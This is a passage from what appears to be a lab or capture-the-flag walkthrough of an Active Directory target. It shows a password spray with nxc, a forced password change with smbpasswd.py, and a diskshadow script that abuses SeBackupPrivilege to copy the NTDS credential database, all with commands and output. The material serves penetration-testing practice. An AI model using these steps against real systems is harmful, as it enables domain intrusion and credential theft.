Foothold

Let’s now do our password spraying with nxc :

nxc smb "10.10.84.72" -u caroline.robinson -p 'BabyStart123!'
SMB         10.10.84.72     445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.10.84.72     445    BABYDC           [-] baby.vl\caroline.robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE



Interesting, we’ll have to change the password of this user. We can do that with smbpasswd.py :

smbpasswd.py -newpass '123Pentest' "baby.vl"/"caroline.robinson":"BabyStart123\!"@"10.10.84.72"

We can see the privilege SeBackupPrivilege, which means we can make a shadowcopy of the disk and dump the NTDS database.
First, create this txt file and upload it to the target :

set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
